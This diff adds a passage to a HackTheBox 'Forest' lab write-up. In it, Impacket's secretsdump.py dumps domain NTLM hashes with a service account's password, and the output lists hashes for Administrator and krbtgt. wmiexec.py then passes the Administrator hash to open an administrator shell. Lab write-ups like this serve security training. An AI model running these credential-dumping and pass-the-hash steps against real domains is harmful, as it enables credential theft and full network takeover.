@@ -967,3 +967,37 @@ Members
 darshan
 The command completed successfully.
 ```
+
+Alternatively, I can also run `secretsdump.py` and get hashes:
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
+└─$ secretsdump.py svc-alfresco:s3rvice@10.10.10.161
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...[snip]...
+[*] Cleaning up... 
+```
+
+** Shell **
+With the hashes for Administrator, I can connect with a tool like `wmiexec`:
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Forest]
+└─$  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+htb\administrator
+```
